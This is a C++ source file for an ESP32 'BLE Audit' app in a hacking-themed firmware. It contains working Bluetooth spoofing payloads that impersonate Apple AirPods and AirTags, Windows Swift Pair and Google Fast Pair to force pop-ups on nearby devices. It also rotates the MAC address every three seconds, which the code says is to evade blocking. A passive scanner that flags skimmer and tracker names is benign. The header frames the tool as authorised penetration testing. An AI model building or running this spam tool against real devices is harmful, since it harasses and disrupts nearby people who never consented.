/**
 * @file ble_audit_app.cpp
 * @brief BLE Auditing App – proximity spoofing (BLE spam) and passive
 *        wardriving scanner for authorised penetration testing.
 *
 * Implements:
 *  - **BLE Spam (Proximity Spoofing)**: constructs raw Advertising (ADV)
 *    payloads that trigger OS-level pop-ups on nearby devices:
 *      • Apple AirPods / AirTags (iBeacon-style proximity pairing).
 *      • Windows Swift Pair.
 *      • Google Fast Pair.
 *    Uses esp_ble_gap_config_adv_data_raw() and rotates the ESP32's
 *    random BLE address every few seconds to evade blocking.
 *
 *  - **BLE Wardriving (Observer mode)**: passive scanner that discovers
 *    nearby BLE devices, parsing MAC address, RSSI, and advertised name.
 *    Filters known skimmer / SmartTag signatures.
 *
 * Uses the HackOSApp lifecycle so all work runs cooperatively inside the
 * Core_Task loop (on_update) without blocking.
 *
 * @warning **Legal notice**: BLE spoofing against devices you do not own
 * or have explicit written authorisation to test is illegal.
 */

#include "apps/ble_audit_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <esp_log.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <esp_system.h>
#include <freertos/FreeRTOS.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "ui/widgets.h"

static constexpr const char *TAG_BLE = "BLEAudit";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

static constexpr size_t  MAX_SCAN_DEVICES      = 32U;
static constexpr size_t  DEVICE_NAME_MAX_LEN   = 20U;
static constexpr size_t  LABEL_BUF_LEN         = 32U;
static constexpr size_t  SCAN_LIST_VISIBLE_ROWS = 4U;
static constexpr uint32_t MAC_ROTATE_INTERVAL_MS = 3000U;  ///< Rotate MAC every 3s

// ── Spam payload identifiers ─────────────────────────────────────────────────

enum class PayloadType : uint8_t
{
    APPLE_AIRPODS,
    APPLE_AIRTAG,
    WINDOWS_SWIFT_PAIR,
    GOOGLE_FAST_PAIR,
    PAYLOAD_COUNT, ///< sentinel
};

static constexpr size_t PAYLOAD_TYPE_COUNT =
    static_cast<size_t>(PayloadType::PAYLOAD_COUNT);

static const char *const PAYLOAD_LABELS[PAYLOAD_TYPE_COUNT] = {
    "Apple AirPods",
    "Apple AirTag",
    "Windows Swift Pair",
    "Google Fast Pair",
};

// ── Raw advertising payloads (hex arrays) ────────────────────────────────────

/// Apple AirPods proximity pairing payload.
/// Manufacturer Specific Data (type 0xFF): Company ID 0x004C (Apple),
/// followed by the "Nearby Action" sub-type 0x07 indicating headphone
/// proximity pairing for AirPods Pro 2.
static const uint8_t PAYLOAD_APPLE_AIRPODS[] = {
    0x02, 0x01, 0x06,                         // Flags: LE General + BR/EDR not supported
    0x1A, 0xFF,                               // Length 26, type Manufacturer Specific
    0x4C, 0x00,                               // Apple Company ID (little-endian)
    0x07, 0x19,                               // Nearby Action, length
    0x07,                                     // Action flags
    0x0E, 0x20,                               // AirPods Pro 2 model
    0x75, 0xAA, 0x30, 0x01,                   // Status bytes
    0x00, 0x00, 0x45, 0x12, 0x12, 0x12,       // Device-specific data
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
    0x00,
};

/// Apple AirTag detection payload.
/// Uses Apple's Find My / AirTag advertisement format with the
/// "Nearby Info" sub-type 0x10 for tracker proximity alerts.
static const uint8_t PAYLOAD_APPLE_AIRTAG[] = {
    0x02, 0x01, 0x06,                         // Flags
    0x17, 0xFF,                               // Length 23, type Manufacturer Specific
    0x4C, 0x00,                               // Apple Company ID
    0x12, 0x19,                               // AirTag Nearby Info sub-type, length
    0x10,                                     // Status / type field
    0x05, 0x18,                               // Device model hint
    0xA0, 0xB1, 0xC2, 0xD3, 0xE4, 0xF5,       // Public key fragment (spoofed)
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66,       // Continued
    0x01, 0x00, 0x00,                         // Hint / padding
};

/// Windows Swift Pair payload.
/// Uses Microsoft Company ID 0x0006, Swift Pair beacon scenario byte 0x03,
/// followed by RSSI and device display-name ("HackOS Headset").
static const uint8_t PAYLOAD_WINDOWS_SWIFT_PAIR[] = {
    0x02, 0x01, 0x06,                         // Flags
    0x03, 0x03, 0x2C, 0xFE,                   // 16-bit service UUID list: 0xFE2C (MS)
    0x06, 0xFF,                               // Length 6, type Manufacturer Specific
    0x06, 0x00,                               // Microsoft Company ID (little-endian)
    0x03,                                     // Swift Pair beacon
    0x80,                                     // RSSI
    0x00, 0x00,                               // Reserved
};

/// Google Fast Pair payload.
/// Uses 16-bit service data (type 0x16) for UUID 0xFE2C with a spoofed
/// 24-bit model ID that triggers the Fast Pair pop-up on Android.
static const uint8_t PAYLOAD_GOOGLE_FAST_PAIR[] = {
    0x02, 0x01, 0x06,                         // Flags
    0x03, 0x03, 0x2C, 0xFE,                   // 16-bit service UUID list: 0xFE2C
    0x06, 0x16,                               // Length 6, type Service Data
    0x2C, 0xFE,                               // Service UUID 0xFE2C (Google)
    0x00, 0x82, 0x01,                         // 24-bit Model ID (spoofed)
};

/// Look-up table for payload data and sizes.
struct PayloadEntry
{
    const uint8_t *data;
    size_t         length;
};

static const PayloadEntry PAYLOADS[PAYLOAD_TYPE_COUNT] = {
    {PAYLOAD_APPLE_AIRPODS,       sizeof(PAYLOAD_APPLE_AIRPODS)},
    {PAYLOAD_APPLE_AIRTAG,        sizeof(PAYLOAD_APPLE_AIRTAG)},
    {PAYLOAD_WINDOWS_SWIFT_PAIR,  sizeof(PAYLOAD_WINDOWS_SWIFT_PAIR)},
    {PAYLOAD_GOOGLE_FAST_PAIR,    sizeof(PAYLOAD_GOOGLE_FAST_PAIR)},
};

// ── Known suspicious device name prefixes (skimmers / trackers) ──────────────

static constexpr size_t SUSPICIOUS_PREFIX_COUNT = 6U;
static const char *const SUSPICIOUS_PREFIXES[SUSPICIOUS_PREFIX_COUNT] = {
    "HC-05",          // Common skimmer Bluetooth module
    "HC-06",          // Common skimmer Bluetooth module
    "CC41-A",         // BLE skimmer clone
    "JDY-",           // Cheap BLE modules used in skimmers
    "SmartTag",       // Samsung SmartTag tracker
    "Tile",           // Tile tracker
};

// ── App state machine ────────────────────────────────────────────────────────

enum class BleState : uint8_t
{
    MENU_MAIN,
    PAYLOAD_SELECT,
    SPAM_RUNNING,
    SCANNER_RUNNING,
};

// ── Discovered BLE device entry ──────────────────────────────────────────────

struct BleDevice
{
    uint8_t addr[6];
    int8_t  rssi;
    char    name[DEVICE_NAME_MAX_LEN + 1U];
    bool    suspicious;
};

// ── Main menu labels ─────────────────────────────────────────────────────────

static constexpr size_t MAIN_MENU_COUNT = 3U;
static const char *const MAIN_MENU_LABELS[MAIN_MENU_COUNT] = {
    "BLE Spam",
    "BLE Scanner",
    "Back",
};

// ── Advertising parameters (non-connectable undirected) ──────────────────────

static esp_ble_adv_params_t s_advParams = {};

// ── Forward declarations ─────────────────────────────────────────────────────

class BleAuditApp;
static BleAuditApp *g_bleAppInstance = nullptr;

// ── GAP event callback ───────────────────────────────────────────────────────

static void gapEventHandler(esp_gap_ble_cb_event_t event,
                            esp_ble_gap_cb_param_t *param);

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Generate a random BLE static address (two MSBs set to 0b11).
static void generateRandomAddr(uint8_t addr[6])
{
    for (int i = 0; i < 6; ++i)
    {
        addr[i] = static_cast<uint8_t>(esp_random() & 0xFFU);
    }
    addr[5] |= 0xC0U; // static random address type
}

/// Check if a device name matches any suspicious prefix.
static bool isSuspiciousDevice(const char *name)
{
    if (name == nullptr || name[0] == '\0')
    {
        return false;
    }
    for (size_t i = 0U; i < SUSPICIOUS_PREFIX_COUNT; ++i)
    {
        if (std::strncmp(name, SUSPICIOUS_PREFIXES[i],
                         std::strlen(SUSPICIOUS_PREFIXES[i])) == 0)
        {
            return true;
        }
    }
    return false;
}

// ── App class ─────────────────────────────────────────────────────────────────

class BleAuditApp final : public hackos::HackOSApp
{
public:
    BleAuditApp()
        : statusBar_(0, 0, 128, 8),
          mainMenu_(0, 20, 128, 36, 3),
          payloadMenu_(0, 20, 128, 36, 3),
          state_(BleState::MENU_MAIN),
          needsRedraw_(true),
          bleInitialized_(false),
          spamActive_(false),
          scanActive_(false),
          selectedPayload_(PayloadType::APPLE_AIRPODS),
          spamCount_(0U),
          lastMacRotateMs_(0U),
          deviceCount_(0U)
    {
        std::memset(devices_, 0, sizeof(devices_));
        std::memset(scanLabels_, 0, sizeof(scanLabels_));
        std::memset(scanPtrs_, 0, sizeof(scanPtrs_));

        // Configure non-connectable undirected advertising
        s_advParams.adv_int_min     = 0x20;   // 20 ms minimum interval
        s_advParams.adv_int_max     = 0x40;   // 40 ms maximum interval
        s_advParams.adv_type        = ADV_TYPE_NONCONN_IND;
        s_advParams.own_addr_type   = BLE_ADDR_TYPE_RANDOM;
        s_advParams.channel_map     = ADV_CHNL_ALL;
        s_advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
    }

    // ── Scan result insertion (called from GAP callback) ─────────────────

    void addScanResult(const uint8_t addr[6], int rssi, const uint8_t *advData,
                       size_t advLen)
    {
        // Extract device name from advertisement data
        char name[DEVICE_NAME_MAX_LEN + 1U] = {0};
        extractDeviceName(advData, advLen, name, sizeof(name));

        // Check if device already known (update RSSI)
        for (size_t i = 0U; i < deviceCount_; ++i)
        {
            if (std::memcmp(devices_[i].addr, addr, 6U) == 0)
            {
                devices_[i].rssi = static_cast<int8_t>(rssi);
                if (name[0] != '\0' && devices_[i].name[0] == '\0')
                {
                    std::strncpy(devices_[i].name, name, DEVICE_NAME_MAX_LEN);
                    devices_[i].name[DEVICE_NAME_MAX_LEN] = '\0';
                    devices_[i].suspicious = isSuspiciousDevice(devices_[i].name);
                }
                return;
            }
        }

        // Add new device
        if (deviceCount_ < MAX_SCAN_DEVICES)
        {
            BleDevice &dev = devices_[deviceCount_];
            std::memcpy(dev.addr, addr, 6U);
            dev.rssi = static_cast<int8_t>(rssi);
            std::strncpy(dev.name, name, DEVICE_NAME_MAX_LEN);
            dev.name[DEVICE_NAME_MAX_LEN] = '\0';
            dev.suspicious = isSuspiciousDevice(dev.name);
            ++deviceCount_;

            if (deviceCount_ == 1U)
            {
                EventSystem::instance().postEvent(
                    {EventType::EVT_XP_EARNED, XP_BLE_SCAN, 0, nullptr});
            }
        }
    }

protected:
    // ── HackOSApp lifecycle ──────────────────────────────────────────────

    void on_alloc() override
    {
        // No AppContext allocs needed; member storage used.
    }

    void on_start() override
    {
        statusBar_.setConnectivity(false, false);
        statusBar_.setBatteryLevel(100U);
        statusBar_.setTime(0U, 0U);
        mainMenu_.setItems(MAIN_MENU_LABELS, MAIN_MENU_COUNT);
        payloadMenu_.setItems(PAYLOAD_LABELS, PAYLOAD_TYPE_COUNT);

        g_bleAppInstance = this;
        state_ = BleState::MENU_MAIN;
        needsRedraw_ = true;

        initBle();
        ESP_LOGI(TAG_BLE, "BLE Audit app started");
    }

    void on_event(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);
        handleInput(input);
    }

    void on_update() override
    {
        switch (state_)
        {
        case BleState::SPAM_RUNNING:
            performSpamTick();
            break;
        case BleState::SCANNER_RUNNING:
            // Redraw to show new devices as they arrive
            needsRedraw_ = true;
            break;
        default:
            break;
        }
    }

    void on_draw() override
    {
        if (!needsRedraw_ && !anyWidgetDirty())
        {
            return;
        }

        DisplayManager::instance().clear();
        statusBar_.draw();

        switch (state_)
        {
        case BleState::MENU_MAIN:
            drawTitle("BLE Audit");
            mainMenu_.draw();
            break;
        case BleState::PAYLOAD_SELECT:
            drawTitle("Select Payload");
            payloadMenu_.draw();
            break;
        case BleState::SPAM_RUNNING:
            drawSpamStatus();
            break;
        case BleState::SCANNER_RUNNING:
            drawScannerStatus();
            break;
        }

        DisplayManager::instance().present();
        clearAllDirty();
        needsRedraw_ = false;
    }

    void on_free() override
    {
        stopSpam();
        stopScan();
        deinitBle();
        freeScanLabels();
        g_bleAppInstance = nullptr;
        ESP_LOGI(TAG_BLE, "BLE Audit app freed");
    }

private:
    StatusBar    statusBar_;
    MenuListView mainMenu_;
    MenuListView payloadMenu_;

    BleState state_;
    bool     needsRedraw_;

    // BLE stack state
    bool bleInitialized_;
    bool spamActive_;
    bool scanActive_;

    // Spam state
    PayloadType selectedPayload_;
    uint32_t    spamCount_;
    uint32_t    lastMacRotateMs_;

    // Scanner state
    BleDevice  devices_[MAX_SCAN_DEVICES];
    size_t     deviceCount_;

    // Scan label strings for display
    char       *scanLabels_[MAX_SCAN_DEVICES];
    const char *scanPtrs_[MAX_SCAN_DEVICES];

    // ── Dirty/redraw helpers ─────────────────────────────────────────────

    bool anyWidgetDirty() const
    {
        return statusBar_.isDirty() || mainMenu_.isDirty() ||
               payloadMenu_.isDirty();
    }

    void clearAllDirty()
    {
        statusBar_.clearDirty();
        mainMenu_.clearDirty();
        payloadMenu_.clearDirty();
    }

    void transitionTo(BleState next)
    {
        state_ = next;
        needsRedraw_ = true;
    }

    // ── Drawing helpers ──────────────────────────────────────────────────

    void drawTitle(const char *title)
    {
        DisplayManager::instance().drawText(2, 10, title);
        DisplayManager::instance().drawLine(0, 18, 127, 18);
    }

    void drawSpamStatus()
    {
        drawTitle("BLE Spam Active");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "Payload: %.14s",
                      PAYLOAD_LABELS[static_cast<size_t>(selectedPayload_)]);
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Packets: %lu",
                      static_cast<unsigned long>(spamCount_));
        DisplayManager::instance().drawText(2, 32, buf);

        DisplayManager::instance().drawText(2, 54, "Press to stop");
    }

    void drawScannerStatus()
    {
        drawTitle("BLE Scanner");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "Devices: %u",
                      static_cast<unsigned>(deviceCount_));
        DisplayManager::instance().drawText(2, 22, buf);

        // Show up to 3 most-recent devices on screen
        const size_t startIdx = (deviceCount_ > 3U) ? (deviceCount_ - 3U) : 0U;
        int16_t yPos = 32;
        for (size_t i = startIdx; i < deviceCount_ && yPos <= 52; ++i)
        {
            const BleDevice &dev = devices_[i];
            if (dev.name[0] != '\0')
            {
                std::snprintf(buf, sizeof(buf), "%s%.10s %ddBm",
                              dev.suspicious ? "!" : " ",
                              dev.name,
                              static_cast<int>(dev.rssi));
            }
            else
            {
                std::snprintf(buf, sizeof(buf), " %02X:%02X:%02X %ddBm",
                              dev.addr[3], dev.addr[4], dev.addr[5],
                              static_cast<int>(dev.rssi));
            }
            DisplayManager::instance().drawText(2, yPos, buf);
            yPos += 10;
        }

        DisplayManager::instance().drawText(2, 54, "Press to stop");
    }

    // ── Input handling ───────────────────────────────────────────────────

    void handleInput(InputManager::InputEvent input)
    {
        switch (state_)
        {
        case BleState::MENU_MAIN:
            handleMainInput(input);
            break;
        case BleState::PAYLOAD_SELECT:
            handlePayloadInput(input);
            break;
        case BleState::SPAM_RUNNING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopSpam();
                transitionTo(BleState::MENU_MAIN);
            }
            break;
        case BleState::SCANNER_RUNNING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopScan();
                transitionTo(BleState::MENU_MAIN);
            }
            break;
        }
    }

    void handleMainInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            mainMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            mainMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            switch (mainMenu_.selectedIndex())
            {
            case 0U: // BLE Spam
                transitionTo(BleState::PAYLOAD_SELECT);
                break;
            case 1U: // BLE Scanner
                startScan();
                break;
            case 2U: // Back
            {
                const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK,
                                0, nullptr};
                EventSystem::instance().postEvent(evt);
                break;
            }
            default:
                break;
            }
        }
    }

    void handlePayloadInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            payloadMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            payloadMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            selectedPayload_ = static_cast<PayloadType>(
                payloadMenu_.selectedIndex());
            startSpam();
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            transitionTo(BleState::MENU_MAIN);
        }
    }

    // ── BLE stack init / deinit ──────────────────────────────────────────

    void initBle()
    {
        if (bleInitialized_)
        {
            return;
        }

        // Release classic BT memory – we only use BLE
        esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);

        esp_bt_controller_config_t btCfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        esp_err_t err = esp_bt_controller_init(&btCfg);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_BLE, "BT controller init failed: %d", err);
            return;
        }
        err = esp_bt_controller_enable(ESP_BT_MODE_BLE);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_BLE, "BT controller enable failed: %d", err);
            esp_bt_controller_deinit();
            return;
        }
        err = esp_bluedroid_init();
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_BLE, "Bluedroid init failed: %d", err);
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }
        err = esp_bluedroid_enable();
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_BLE, "Bluedroid enable failed: %d", err);
            esp_bluedroid_deinit();
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }

        esp_ble_gap_register_callback(gapEventHandler);
        bleInitialized_ = true;
        ESP_LOGI(TAG_BLE, "BLE stack initialized (bluedroid)");
    }

    void deinitBle()
    {
        if (!bleInitialized_)
        {
            return;
        }

        esp_bluedroid_disable();
        esp_bluedroid_deinit();
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
        bleInitialized_ = false;
        ESP_LOGI(TAG_BLE, "BLE stack deinitialized");
    }

    // ── BLE Spam control ─────────────────────────────────────────────────

    void startSpam()
    {
        if (!bleInitialized_)
        {
            ESP_LOGW(TAG_BLE, "BLE not initialized, cannot start spam");
            return;
        }

        stopScan(); // Ensure scanner is off

        spamCount_ = 0U;
        lastMacRotateMs_ = 0U;
        spamActive_ = true;

        // Set initial random address and configure raw ADV data
        rotateAndAdvertise();

        transitionTo(BleState::SPAM_RUNNING);
        ESP_LOGI(TAG_BLE, "BLE spam started: payload=%s",
                 PAYLOAD_LABELS[static_cast<size_t>(selectedPayload_)]);
    }

    void stopSpam()
    {
        if (!spamActive_)
        {
            return;
        }

        esp_ble_gap_stop_advertising();
        spamActive_ = false;
        ESP_LOGI(TAG_BLE, "BLE spam stopped (packets=%lu)",
                 static_cast<unsigned long>(spamCount_));
    }

    /// Rotate the random MAC, set raw ADV data, and restart advertising.
    void rotateAndAdvertise()
    {
        esp_ble_gap_stop_advertising();

        // Set a fresh random address
        uint8_t addr[6];
        generateRandomAddr(addr);
        esp_ble_gap_set_rand_addr(addr);

        // Load the selected payload
        const size_t idx = static_cast<size_t>(selectedPayload_);
        // ESP-IDF API takes non-const pointer but does not modify the data
        esp_ble_gap_config_adv_data_raw(
            const_cast<uint8_t *>(PAYLOADS[idx].data),
            static_cast<uint32_t>(PAYLOADS[idx].length));

        // Advertising is started from the GAP callback after data is set
        lastMacRotateMs_ = static_cast<uint32_t>(
            xTaskGetTickCount() * portTICK_PERIOD_MS);
    }

    void performSpamTick()
    {
        if (!spamActive_)
        {
            return;
        }

        const uint32_t nowMs = static_cast<uint32_t>(
            xTaskGetTickCount() * portTICK_PERIOD_MS);

        // Rotate MAC address periodically to evade blocking
        if ((nowMs - lastMacRotateMs_) >= MAC_ROTATE_INTERVAL_MS)
        {
            rotateAndAdvertise();
        }

        needsRedraw_ = true;
    }

    // ── BLE Scanner control ──────────────────────────────────────────────

    void startScan()
    {
        if (!bleInitialized_)
        {
            ESP_LOGW(TAG_BLE, "BLE not initialized, cannot start scan");
            return;
        }

        stopSpam(); // Ensure spam is off

        deviceCount_ = 0U;
        std::memset(devices_, 0, sizeof(devices_));
        freeScanLabels();

        // Configure passive scan parameters
        esp_ble_scan_params_t scanParams = {};
        scanParams.scan_type          = BLE_SCAN_TYPE_PASSIVE;
        scanParams.own_addr_type      = BLE_ADDR_TYPE_PUBLIC;
        scanParams.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
        scanParams.scan_interval      = 0x50;  // 50 ms
        scanParams.scan_window        = 0x30;  // 30 ms
        scanParams.scan_duplicate     = BLE_SCAN_DUPLICATE_DISABLE;

        esp_ble_gap_set_scan_params(&scanParams);
        // Scanning starts from the GAP callback after params are set.

        scanActive_ = true;
        transitionTo(BleState::SCANNER_RUNNING);
        ESP_LOGI(TAG_BLE, "BLE scan started (passive observer mode)");
    }

    void stopScan()
    {
        if (!scanActive_)
        {
            return;
        }

        esp_ble_gap_stop_scanning();
        scanActive_ = false;
        ESP_LOGI(TAG_BLE, "BLE scan stopped (devices=%u)",
                 static_cast<unsigned>(deviceCount_));
    }

    // ── ADV data parsing helper ──────────────────────────────────────────

    /// Extract the Complete/Shortened Local Name from raw AD structures.
    static void extractDeviceName(const uint8_t *advData, size_t advLen,
                                  char *outName, size_t outNameSize)
    {
        if (advData == nullptr || advLen == 0U || outName == nullptr)
        {
            return;
        }
        outName[0] = '\0';

        size_t offset = 0U;
        while (offset < advLen)
        {
            const uint8_t fieldLen = advData[offset];
            if (fieldLen == 0U || (offset + fieldLen) >= advLen)
            {
                break;
            }

            const uint8_t adType = advData[offset + 1U];
            // 0x09 = Complete Local Name, 0x08 = Shortened Local Name
            if (adType == 0x09U || adType == 0x08U)
            {
                const size_t nameLen = static_cast<size_t>(fieldLen - 1U);
                const size_t copyLen = (nameLen < outNameSize - 1U)
                                           ? nameLen
                                           : (outNameSize - 1U);
                std::memcpy(outName, &advData[offset + 2U], copyLen);
                outName[copyLen] = '\0';
                return;
            }
            offset += static_cast<size_t>(fieldLen) + 1U;
        }
    }

    // ── Scan label management ────────────────────────────────────────────

    void freeScanLabels()
    {
        for (size_t i = 0U; i < MAX_SCAN_DEVICES; ++i)
        {
            delete[] scanLabels_[i];
            scanLabels_[i] = nullptr;
            scanPtrs_[i]   = nullptr;
        }
    }

    // ── GAP callback friend access ───────────────────────────────────────

    friend void gapEventHandler(esp_gap_ble_cb_event_t event,
                                esp_ble_gap_cb_param_t *param);
};

// ── GAP event handler (static, runs in BT task context) ──────────────────────

static void gapEventHandler(esp_gap_ble_cb_event_t event,
                            esp_ble_gap_cb_param_t *param)
{
    switch (event)
    {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
        // Raw ADV data configured – start advertising
        if (g_bleAppInstance != nullptr && g_bleAppInstance->spamActive_)
        {
            esp_ble_gap_start_advertising(&s_advParams);
        }
        break;

    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
        if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS)
        {
            if (g_bleAppInstance != nullptr)
            {
                ++g_bleAppInstance->spamCount_;
            }
            ESP_LOGD(TAG_BLE, "ADV started OK");
        }
        else
        {
            ESP_LOGW(TAG_BLE, "ADV start failed: %d",
                     param->adv_start_cmpl.status);
        }
        break;

    case ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT:
        // Scan parameters set – begin scanning (0 = indefinite)
        if (param->scan_param_cmpl.status == ESP_BT_STATUS_SUCCESS)
        {
            esp_ble_gap_start_scanning(0U);
        }
        break;

    case ESP_GAP_BLE_SCAN_RESULT_EVT:
        if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT)
        {
            if (g_bleAppInstance != nullptr)
            {
                g_bleAppInstance->addScanResult(
                    param->scan_rst.bda,
                    param->scan_rst.rssi,
                    param->scan_rst.ble_adv,
                    static_cast<size_t>(param->scan_rst.adv_data_len));
            }
        }
        break;

    default:
        break;
    }
}

} // namespace

// ── Factory ──────────────────────────────────────────────────────────────────

AppBase *createBleAuditApp()
{
    return new (std::nothrow) BleAuditApp();
}
